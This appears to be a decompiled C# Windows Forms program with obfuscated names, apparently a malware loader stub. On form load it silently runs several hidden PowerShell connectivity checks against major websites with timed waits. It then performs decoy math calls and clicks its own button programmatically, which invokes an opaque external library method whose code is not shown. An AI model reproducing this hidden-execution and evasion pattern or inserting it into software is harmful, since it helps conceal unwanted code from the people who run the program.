using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Leqebkelbvqlfcub;
using Stihcpdaboumyasclt.Roles;
using Stihcpdaboumyasclt.Shared;

namespace ConsoleApp5.Importers;

public sealed class Facade : Form
{
	private IContainer database;

	private Button m_Test;

	public Facade()
	{
		PrepareInitializer();
	}

	private void CustomizeInitializer(object sender, EventArgs e)
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = "Test-Connection -ComputerName youtube.com",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		})!.WaitForExit(2000);
		Process.Start(new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = "Test-Connection -ComputerName google.com",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		})!.WaitForExit(2000);
		Process.Start(new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = "Test-Connection -ComputerName facebook.com",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		})!.WaitForExit(2000);
		Process.Start(new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = "Test-Connection -ComputerName outlook.com",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		})!.WaitForExit(5000);
		Process.Start(new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = "Test-Connection -ComputerName bing.com",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		})!.WaitForExit(5000);
		Process.Start(new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = "Test-Connection -ComputerName google.com",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		})!.WaitForExit(5000);
		Account account = SearchInitializer;
		account(5.0);
		Token token = new Token();
		token.ComputeInitializer(account, 0.0, 6.0, (AuthorCompletionSetKind)1);
		token.ComputeInitializer(Math.Sin, 0.0, Math.PI, (AuthorCompletionSetKind)0);
		token.ComputeInitializer(Math.Sin, 0.0, Math.PI, (AuthorCompletionSetKind)1);
		token.ComputeInitializer(Math.Sin, 0.0, Math.PI, (AuthorCompletionSetKind)2);
		m_Test.PerformClick();
	}

	private void UpdateInitializer(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		new ClassLibrary().Data();
	}

	private double SearchInitializer(double info)
	{
		return Math.Exp(info) + Math.Log10(info);
	}

	protected override void Dispose(bool overrideres)
	{
		if (overrideres && database != null)
		{
			database.Dispose();
		}
		((Form)this).Dispose(overrideres);
	}

	private void PrepareInitializer()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		m_Test = new Button();
		((Control)this).SuspendLayout();
		((Control)m_Test).set_Location(new Point(90, 57));
		((Control)m_Test).set_Name("button1");
		((Control)m_Test).set_Size(new Size(647, 308));
		((Control)m_Test).set_TabIndex(0);
		((Control)m_Test).set_Text("Click");
		((ButtonBase)m_Test).set_UseVisualStyleBackColor(true);
		((Control)m_Test).add_Click((EventHandler)UpdateInitializer);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)m_Test);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("test");
		((Form)this).add_Load((EventHandler)CustomizeInitializer);
		((Control)this).ResumeLayout(false);
	}
}
